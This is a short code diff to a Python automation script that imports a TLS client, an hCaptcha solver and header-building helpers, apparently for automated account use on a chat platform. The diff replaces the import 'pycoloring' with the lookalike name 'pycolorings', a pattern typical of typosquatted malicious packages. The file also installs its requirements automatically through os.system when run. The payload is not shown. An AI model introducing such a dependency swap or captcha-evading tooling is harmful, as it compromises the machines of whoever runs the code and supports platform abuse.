@@ -2,7 +2,7 @@ import tls_client, json, random, string, threading, yaml
 from modules.utilities import get_useragent, build_xsp, get_version, get_username
 import os
 os.system("pip install -r requirements.txt") #installing requirements file
-from pycoloring import color
+from pycolorings import color
 from modules.hcaptcha import solve_captcha
 
 
